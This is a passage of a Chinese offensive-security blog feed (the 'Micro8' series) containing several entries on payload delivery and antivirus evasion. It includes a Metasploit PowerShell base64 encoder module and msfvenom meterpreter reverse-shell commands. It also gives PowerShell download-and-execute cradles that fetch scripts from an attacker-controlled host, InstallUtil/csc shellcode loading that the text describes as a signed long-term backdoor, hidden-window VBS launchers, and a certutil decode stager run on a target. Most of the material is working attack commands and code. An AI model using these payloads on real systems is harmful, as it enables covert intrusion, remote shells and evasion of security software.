class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># copy base64.rb to metasploit-framework/embedded/framework/modules/encoders/powershell.If powershell is empty,mkdir powershell.</span></span><br><span class="line"><span class="comment"># E.g</span></span><br><span class="line"><span class="comment"># msf encoder(powershell/base64) &gt; use exploit/multi/handler</span></span><br><span class="line"><span class="comment"># msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="comment"># payload =&gt; windows/x64/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="comment"># msf exploit(multi/handler) &gt; exploit</span></span><br><span class="line"><span class="comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows.</span></span><br><span class="line"><span class="comment"># [*] Started reverse TCP handler on xx.1xx.xx.xx:xx</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Encoder</span></span><br><span class="line">    Rank = NormalRanking</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></span><br><span class="line">    <span class="keyword">super</span>(</span><br><span class="line">    <span class="string">'Name'</span> =&gt; <span class="string">'Powershell Base64 Encoder'</span>,</span><br><span class="line">    <span class="string">'Description'</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx</span></span><br><span class="line"><span class="string">-f psh-reflection --arch x64 --platform windows | msfvenom -e</span></span><br><span class="line"><span class="string">powershell/base64 --arch x64 --platform windows.</span></span><br><span class="line"><span class="string">    &#125;</span>,</span><br><span class="line">    <span class="string">'Author'</span> =&gt; <span class="string">'Micropoor'</span>,</span><br><span class="line">    <span class="string">'Arch'</span> =&gt; ARCH_CMD,</span><br><span class="line">    <span class="string">'Platform'</span> =&gt; <span class="string">'win'</span>)</span><br><span class="line"></span><br><span class="line">register_options([</span><br><span class="line">OptBool.new(<span class="string">'payload'</span>, [ <span class="literal">false</span>, <span class="string">'Use payload '</span>, <span class="literal">false</span> ]), </span><br><span class="line">OptBool.new(<span class="string">'x64'</span>,[ <span class="literal">false</span>, <span class="string">'Use syswow64 powershell'</span>, <span class="literal">false</span> ])</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_block</span><span class="params">(state, buf)</span></span></span><br><span class="line">base64 = Rex::Text.encode_base64(Rex::Text.to_unicode(buf)) </span><br><span class="line">cmd = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> datastore[<span class="string">'x64'</span>]</span><br><span class="line">    cmd += <span class="string">'c:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe '</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    cmd += <span class="string">'powershell.exe '</span> </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> datastore[<span class="string">'payload'</span>]</span><br><span class="line">    cmd += <span class="string">'-windowstyle hidden -exec bypass -NoExit '</span> </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">cmd += <span class="string">"-EncodedCommand \#&#123;base64&#125;"</span> </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if use caidao</span></span><br><span class="line"><span class="comment"># execute echo powershell -windowstyle hidden -exec bypass -c \""IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.117/xxx.ps1');\""|msfvenom -e x64/xor4 --arch x64 --platform windows</span></span><br><span class="line"><span class="comment"># xxx.ps1 is msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows.</span></span><br></pre></td></tr></table></figure><blockquote><p>copy powershell_base64.rb to metasploit‐framework/embedded/framework/modules/encoders/powershell.If powershell is empty,mkdir powershell.</p></blockquote><p>参数 payload 选择是否使用 Metasploit payload，来去掉 powershell 的关键字。</p><p>例1（目标出网，下载执行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo powershell ‐windowstyle hidden ‐exec bypass ‐c \&quot;&quot;IEX (New‐ObjectNet.WebClient).DownloadString(&apos;http://192.168.1.117/micropoor.ps1&apos;);\&quot;&quot;|msfvenom ‐e powershell/base64 ‐‐arch x64 ‐‐platform windows</span><br></pre></td></tr></table></figure><p><img src="../do/media/837e8a66210018c4e7891f7cc44ae8dc.jpg" alt>  </p><p><img src="../do/media/3101ba162d3677409f14f2e6f58a5d2d.jpg" alt></p><p>例2（目标不出网，本地执行）<br><img src="../do/media/274ee525bf8c174b256047a449e2165c.jpg" alt></p><h3 id="注：加payload参数"><a href="#注：加payload参数" class="headerlink" title="注：加payload参数"></a>注：加payload参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.117 LPORT=8080 ‐f psh‐reflection ‐‐arch x64 ‐‐platform windows | msfvenom ‐e powershell/base64 ‐‐arch x64 ‐‐platform windows payload</span><br></pre></td></tr></table></figure><p>更多有趣的实验：</p><p>把例1的 down 内容更改为例2，并且去掉 payload 参数。来减小 payload 大小。</p><p>更改 Invoke-Mimikatz.ps1 等。</p><p><img src="../do/media/1668ff8230cc690822b002a58bed23b7.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>48、payload分离免杀思路第二季</title>
      <link href="/article/48_payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3.html"/>
      <url>/article/48_payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p>payload 分离免杀思路第一季是专门针对 x32 系统，以及针对 xp 包括以下版本。而在实战中，目标机器多为 Windows7 以上版本。而服务器以 x64 位居多。在第一季中，借助了非微软自带第三方来执行 Shellcode，这一季采取调用微软自带来执行 Shellcode，这里就会有一个好处，调用自带本身一定就会有微软的签名，从而绕过反病毒软件。</p><h3 id="介绍相关概念："><a href="#介绍相关概念：" class="headerlink" title="介绍相关概念："></a>介绍相关概念：</h3><p>Windows 自 Windows XP Media Center Edition 开始默认安装 NET Framework，直至目前的 Windows 10，最新的默认版本为4.6.00081.00。随着装机量，最新默认安装版本为4.7.2053.0。</p><h3 id="csc-exe："><a href="#csc-exe：" class="headerlink" title="csc.exe："></a>csc.exe：</h3><p>C# 的在 Windows 平台下的编译器名称是 Csc.exe，如果你的 .NET FrameWork SDK 安装在 C 盘，那么你可以在 <code>C:\WINNT\Microsoft.NET\Framework\xxxxx</code> 目录中发现它。为了使用方便，你可以手动把这个目录添加到 Path 环境变量中去。用 Csc.exe 编译 HelloWorld.cs 非常简单，打开命令提示符，并切换到存放 test.cs 文件的目录中，输入下列行命令: <code>csc /target:exe test.cs</code>将 Ttest.cs 编译成名为 test.exe 的 console 应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//test.cs</span><br><span class="line">using System; </span><br><span class="line">class TestApp </span><br><span class="line">&#123;</span><br><span class="line">    public static void Main()</span><br><span class="line">    &#123;</span><br><span class="line">    Console.WriteLine(&quot;Micropoor!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="InstallUtil-exe："><a href="#InstallUtil-exe：" class="headerlink" title="InstallUtil.exe："></a>InstallUtil.exe：</h3><p>微软官方介绍如下：</p><blockquote><p>The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. This tool works in conjunction with classes in the System.Configuration.Install namespace.<br>This tool is automatically installed with Visual Studio. To run the tool,use the Developer Command Prompt (or the Visual Studio Command Prompt in Windows7). For more information, see Command Prompts.<br><a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool</a></p></blockquote><p>关于两个文件默认安装位置：（注意x32，x64区别）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br></pre></td></tr></table></figure><p>文章采取2种demo来辅助本文中心思想。</p><h3 id="demo1："><a href="#demo1：" class="headerlink" title="demo1："></a>demo1：</h3><p>以抓密码为例：测试环境：目标A机安装了 360 套装。目标机 B 安装了小红伞，NOD32。目标机安 C 装了麦咖啡。<br>生成秘钥：<br><img src="../do/media/cf8406093e5dbf031342ac48beecbb20.jpg" alt></p><p>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /keyfile:C:\Users\Johnn\Desktop\installutil.snk /unsafe</span><br><span class="line">C:\Users\Johnn\Desktop\mimi.cs</span><br></pre></td></tr></table></figure><p><img src="../do/media/b24b55a30609a64e9ae6eedd59669600.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Johnn\Desktop\Micropoor.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/54e053d6ba6b7ddf3ecff38b2e4b554c.jpg" alt>  </p><p><img src="../do/media/14d88766fa1337b2a7a1f4fcd0e41e7b.jpg" alt></p><h3 id="demo2："><a href="#demo2：" class="headerlink" title="demo2："></a>demo2：</h3><p>以msf为例：<br>生成shllcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform Windows -a x64 -p windows/x64/meterpreter/reverse_tcp_uuid LHOST=192.168.1.5 LPORT=8080 -b &apos;\x00&apos; -e x64/xor -i 10 -f csharp -o ./Micropoor.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/60dc9d8d0c0d3716c0111382fda0880f.jpg" alt>  </p><p><img src="../do/media/06b4768ab7fb03e67d866bfa3535a8d0.jpg" alt></p><p>替换shellcode。<br><img src="../do/media/1981b698893f18b579b053c1c47cbbb5.jpg" alt></p><p>编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /unsafe /platform:x64 /out:Micropoor.exe M.cs</span><br></pre></td></tr></table></figure><p><img src="../do/media/44a48a754a1077975cf9f7245474d6f4.jpg" alt></p><p>运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/2e2468278724012a07b672ba28994b41.jpg" alt></p><p><strong>注：在实际测试的过程，起监听需要配置一些参数，防止假死与假session。</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set exitonsession false </span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf exploit(multi/handler) &gt; set EnableStageEncoding true</span><br><span class="line">EnableStageEncoding =&gt; true</span><br><span class="line">msf exploit(multi/handler) &gt;</span><br><span class="line">msf exploit(multi/handler) &gt; set Stageencoder x64/xor </span><br><span class="line">Stageencoder =&gt; x64/xor</span><br><span class="line">msf exploit(multi/handler) &gt; set stageencodingfallback false</span><br><span class="line">stageencodingfallback =&gt; false</span><br><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><p><img src="../do/media/e0546970d950f42b600bc2c6822981e2.jpg" alt></p><p>上线：<br><img src="../do/media/c77a11ea1cd8acacd645ffd057050d18.jpg" alt></p><p>mimi.cs 953.71 KB<br>shllcode.cs</p><blockquote><p>  后者的话：该方法可以做一个带签名的长期后门。</p><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>47、payload分离免杀思路</title>
      <link href="/article/47_payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html"/>
      <url>/article/47_payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html</url>
      
        <content type="html"><![CDATA[<p>目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对 PE 头文件的查杀。尤其是当 payload 文件越大的时候，特征越容易查杀。</p><p>既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免 PE 头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于 windows 下为了更稳定的一种常用手法。载入内存。</p><h3 id="0x00-以msf为例：监听端口"><a href="#0x00-以msf为例：监听端口" class="headerlink" title="0x00:以msf为例：监听端口"></a>0x00:以msf为例：监听端口</h3><p><img src="../do/media/e443cf6dc02a20a342291d5c06ccec4f.jpg" alt></p><h3 id="0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为："><a href="#0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：" class="headerlink" title="0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为："></a>0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.5 lport=8080 -e x86/shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure><p><img src="../do/media/1a912494f05f8ca99edf268225e1a66f.jpg" alt></p><h3 id="0x02-既然是shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源："><a href="#0x02-既然是shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源：" class="headerlink" title="0x02:既然是shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源："></a>0x02:既然是shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源：</h3><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a></p><p><strong>作者的话：建议大家自己写shellcode执行盒，相关代码网上非常成熟。如果遇到问题，随时可以问我。</strong>  </p><p><img src="../do/media/168b6471db08e03cbca360642e0bcb0c.jpg" alt></p><p>生成的payload大小如下：476字节。还是 X32位的 payload。<br><img src="../do/media/92ab172a1914132282d7a5bfd14ab31d.jpg" alt></p><p>国内世界杀毒网：<br><img src="../do/media/7749133623a7d6b774e000605ce77a57.jpg" alt></p><p>国际世界杀毒网：<br><img src="../do/media/663bc4d955c71bf9882c9a31761e0c14.jpg" alt></p><p>上线成功。<br><img src="../do/media/be28c1202684af6369757b813f4d9649.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>46、powershell一句话下载payload</title>
      <link href="/article/46_powershell%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html"/>
      <url>/article/46_powershell%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html</url>
      
        <content type="html"><![CDATA[<p>自 Windows7 以后内置了 powershell，如Windows 7 中内置了 PowerShell2.0, Windows 8 中内置了 PowerShell3.0。</p><p><strong>靶机：windows 7</strong><br>powershell $PSVersionTable<br><img src="../do/media/07fa8437a844c082c950d5643c994ef1.jpg" alt></p><h3 id="down-ps1"><a href="#down-ps1" class="headerlink" title="down.ps1:"></a>down.ps1:</h3><p>基于System.Net.WebClient<br><img src="../do/media/c539c15cfe12c5ae4c5846e6b5a485b3.jpg" alt></p><p><img src="../do/media/8772baf3212d72078525abfa44923db1.jpg" alt></p><h3 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Urls</span> = @()</span><br><span class="line"><span class="variable">$Urls</span> += <span class="string">"http://192.168.1.115/robots.txt"</span></span><br><span class="line"><span class="variable">$OutPath</span> = <span class="string">"E:\PDF\"</span> </span><br><span class="line"><span class="keyword">ForEach</span> ( <span class="variable">$item</span> <span class="keyword">in</span> <span class="variable">$Urls</span>) &#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$OutPath</span> + (<span class="variable">$item</span>).split(<span class="string">'/'</span>)[-<span class="number">1</span>]</span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="variable">$item</span>, <span class="variable">$file</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>靶机：windows 2012</strong><br>powershell $PSVersionTable<br><img src="../do/media/eaa0bd3c317ef0ae922676a353c59f15.jpg" alt></p><h3 id="down-ps1-1"><a href="#down-ps1-1" class="headerlink" title="down.ps1:"></a>down.ps1:</h3><p>在 powershell 3.0以后，提供 wget 功能，既 Invoke-WebRequest<br><img src="../do/media/218c38bbb622f9c8a2634cc1c1a713c3.jpg" alt></p><p><code>C:\inetpub&gt;powershell C:\inetpub\down.ps1</code><br>注：需要绝对路径。</p><p><img src="../do/media/e6557dac203ad4ac9cc208f135f56307.jpg" alt>  </p><p><img src="../do/media/69ef693d770cee3f0a5bd9dfdee62f0a.jpg" alt></p><h3 id="附：-1"><a href="#附：-1" class="headerlink" title="附："></a>附：</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">"http://192.168.1.115/robots.txt"</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">"C:\inetpub\robots.txt"</span></span><br><span class="line"><span class="variable">$start_time</span> = <span class="built_in">Get-Date</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> -Uri <span class="variable">$url</span> -OutFile <span class="variable">$output</span></span><br><span class="line"><span class="built_in">Write-Output</span> <span class="string">"Time : $((Get-Date).Subtract(<span class="variable">$start_time</span>).Seconds) second(s)"</span></span><br></pre></td></tr></table></figure><p><strong>当然也可以一句话执行下载：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.1.115/robots.txt&apos;,&apos;E:\robots.txt&apos;)</span><br></pre></td></tr></table></figure><p><img src="../do/media/d40cd11aaad0632c0941441a31e3286f.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>45、解决bat一句话下载payload黑窗</title>
      <link href="/article/45_%E8%A7%A3%E5%86%B3bat%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E9%BB%91%E7%AA%97.html"/>
      <url>/article/45_%E8%A7%A3%E5%86%B3bat%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E9%BB%91%E7%AA%97.html</url>
      
        <content type="html"><![CDATA[<p>实战中，需要用 bat 解决的事情总会碰到，而针对不同的环境，可能同一件事情需要不同的方案。</p><h3 id="demo-测试bat"><a href="#demo-测试bat" class="headerlink" title="demo:测试bat"></a>demo:测试bat</h3><p>bat 内容：追加到bat.txt里。<br><img src="../do/media/c88eaa0827ffcda7b8bf145ab166128e.jpg" alt></p><p><img src="../do/media/ac6b7ca7ff474a41f6c4e3b39740c63e.jpg" alt></p><h3 id="附代码："><a href="#附代码：" class="headerlink" title="附代码："></a>附代码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set oShell = CreateObject (&quot;Wscript.Shell&quot;)</span><br><span class="line">Dim strArgs</span><br><span class="line">strArgs = &quot;cmd /c bat.bat&quot;</span><br><span class="line">oShell.Run strArgs, 0, false</span><br></pre></td></tr></table></figure><p>但是代码过长，需要追加写入。需要简化下代码。<br><img src="../do/media/4459b76b982a0d54de0cba76496b2f07.jpg" alt></p><h3 id="附代码：-1"><a href="#附代码：-1" class="headerlink" title="附代码："></a>附代码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run &quot;bat.bat&quot;, 0, True</span><br></pre></td></tr></table></figure><p>如果需要在目标机上执行多个 bat，如果需要把代码中的 bat.bat 变成变量的话。<br><img src="../do/media/362d2fd19ae38ea13dd9f7f4b7e7b845.jpg" alt></p><h3 id="附代码：-2"><a href="#附代码：-2" class="headerlink" title="附代码："></a>附代码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">If WScript.Arguments.Count &gt;= 1 Then</span><br><span class="line">ReDim arr(WScript.Arguments.Count‐1)</span><br><span class="line">For i = 0 To WScript.Arguments.Count‐1</span><br><span class="line">Arg = WScript.Arguments(i)</span><br><span class="line">If InStr(Arg, &quot; &quot;) &gt; 0 Then Arg = &quot;&quot;&quot;&quot; &amp; Arg &amp; &quot;&quot;&quot;&quot;</span><br><span class="line">arr(i) = Arg</span><br><span class="line">Next </span><br><span class="line"></span><br><span class="line">RunCmd = Join(arr)</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run RunCmd, 0, True</span><br><span class="line">End If</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>44、ertutil一句话下载payload补充</title>
      <link href="/article/44_ertutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.html"/>
      <url>/article/44_ertutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.html</url>
      
        <content type="html"><![CDATA[<p>第八季中提到了 certutil 的加密与解密。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;certutil -encode c:\downfile.vbs downfile.bat</span><br></pre></td></tr></table></figure><p>而配合 powershell 的内存加载，则可把 certutil 发挥更强大。</p><p><strong>靶机：windows 2012</strong></p><p>而今天需要的是一款 powershell 的混淆框架的配合<br><a href="https://github.com/danielbohannon/Invoke-CradleCrafter" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-CradleCrafter</a></p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-CradleCrafter.psd1 Invoke-CradleCrafter</span><br><span class="line">```  </span><br><span class="line">![](../do/media/c62807cec766f0f6c92c2d821cd6ede3.jpg)</span><br><span class="line"></span><br><span class="line">![](../do/media/5fd8400f05ad1fe156649bb7d4ab2726.jpg)</span><br><span class="line"></span><br><span class="line">如果在加载 powershell 脚本的时候提示：**powershell</span><br><span class="line">进行数字签运行该脚本。**</span><br><span class="line">则先执行：</span><br><span class="line">```code</span><br><span class="line">set-executionpolicy Bypass</span><br></pre></td></tr></table></figure><p>生成payload：（有关生成payload，会在未来的系列中讲到）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:/tmp# msfvenom ‐p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐e cmd/powershell_base64 ‐f psh ‐o Micropoor.txt</span><br></pre></td></tr></table></figure><p><img src="../do/media/316a532d526b20050d34d02f8f06e952.jpg" alt></p><p><img src="../do/media/cfa22fb95c6b008829035e91928f47db.jpg" alt></p><p><strong>启动apache：</strong><br><img src="../do/media/d34911ee8f5ed23aaef4fe39846d7c4d.jpg" alt></p><p><strong>powershell框架设置：</strong></p><p>SET URL <a href="http://192.168.1.5/Micropoor.txt" target="_blank" rel="noopener">http://192.168.1.5/Micropoor.txt</a><br><img src="../do/media/bc3142653214ae8fd411b32efcdb77a8.jpg" alt></p><p><strong>MEMORY</strong><br><img src="../do/media/62d726b8feae58ada003965ac15cfe4a.jpg" alt></p><p><strong>CERTUTIL</strong><br><img src="../do/media/b700f3bfebafc44073df52b62d79d73c.jpg" alt></p><p><strong>ALL</strong><br><img src="../do/media/9b29ae29a5bf7fd27b9ded5b889844c4.jpg" alt></p><p><strong>1</strong><br><img src="../do/media/f14a65e3707c230527b14312400969e0.jpg" alt></p><p><strong>混淆内容保存txt，后进行encode</strong><br><img src="../do/media/17b242fcc60d1fa5eb54d8f2c6268331.jpg" alt></p><p>把 cer.cer 与 Micropoo.txt 放置同一目录下。  </p><p><strong>目标机执行：</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString(&apos;http://192.168.1.5/cer.cer&apos;); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start /b cmd /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start /b cmd /c del %APPDATA%\cer.cer</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>43、js一句话下载payload</title>
      <link href="/article/43_js%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload.html"/>
